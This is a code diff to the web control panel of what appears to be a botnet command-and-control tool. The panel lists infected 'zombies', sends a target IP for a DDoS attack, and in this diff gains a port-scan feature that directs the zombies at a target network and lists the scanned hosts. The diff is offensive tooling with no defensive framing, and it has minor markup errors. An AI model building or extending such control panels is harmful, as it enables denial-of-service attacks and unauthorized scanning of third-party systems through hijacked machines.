@@ -68,23 +68,50 @@ $(function(){
 function msghandler(json){
 
 	json = JSON.parse(json);
+
 	if(json.hasOwnProperty('newzombieId') == true){
 
 		$("table[name='zombies']").append(	"<tr class='active'><td id="+json['newzombieId']+">"+json['newzombieHost']+"<span class ='glyphicon glyphicon-flash'></span></td></tr>");
 	}
+
+	if(json.hasOwnProperty("host")==true){
+
+			$("tbody[name='hosts']").append(	"<tr class='active'><td><span class ='glyphicon glyphicon-flash'>"+json['host']+"</span></td></tr>");
+	}
+
 }
 
 
 
 function ddos(){
 
-	var targ = $("#target").val()
+	var targ = $("#target").val();
 	$.ajax({
 		url:"{% url 'control-DDOS'%}",
 		type:'POST',
 		dataType:"json",
 		data:{'targetip':targ}
 	});
+}
+
+
+function portscan(){
+	var targ = $("#network").val();
+	$.ajax({
+		url:"{% url 'control-PORTSCAN' %}",
+		type: 'POST',
+		dataType:"json",
+		data: {'targetnet':targ},
+		success: function(json){
+			if(json.hasOwnProperty('ack')==true){
+				bootbox.alert("Port scan started");
+			}
+			else if(json.hasOwnProperty('failed')==true){
+				bootbox.alert("Port scan failed");
+			}
+		}
+	});
+
 }
 
 function cancel(){
@@ -112,8 +139,17 @@ function createHook(){
 	});
 }
 $(function(){$(".ddos").hide();})
+$(function(){$(".portscan").hide();})
+$(function(){$(".hosts").hide();})
 
-function drop(input){ $("."+input).toggle();}
+function drop(input){ $("."+input).toggle();
+
+	if(input.match("portscan")){
+
+		$(".hosts").toggle();
+	}
+
+}
 
 
 </script>
@@ -170,6 +206,9 @@ function drop(input){ $("."+input).toggle();}
 			<tr>
 				<td><button style="width: 100%;" onclick="drop('ddos');" class="btn btn-default"> DDOS</button></td>
 				</tr>
+			<tr>
+					<td><button style="width: 100%;" onclick="drop('portscan');" class="btn btn-default">PORT SCAN</button</td>
+				</tr>
 
 		</tbody>
 		</table>
@@ -190,6 +229,28 @@ function drop(input){ $("."+input).toggle();}
 			<button onclick="ddos();" class="btn btn-default">Start Attack</button>
 			<button onclick="cancel();" class="btn btn-default">Cancel</button>
 		</div>
+		</div>
+
+
+		<div class="portscan">
+			<div class="form-inline">
+				<div class="form-group">
+					<label for="network">Network Target</label>
+					<input type="text" clas="form-control" id="network" placeholder="target zombie">
+				</div>
+				<button onclick="portscan();" class="btn btn-default">Start Attack</button>
+			</div>
+		</div>
+
+
+
+
+		<div class="hosts">
+				<h1 style="text-align: center;"><small>Scanned Hosts</small></h1>
+			<table class ="table table-condensed" >
+				<tbody name="hosts">
+			</tbody>
+			</table>
 		</div>
 
 
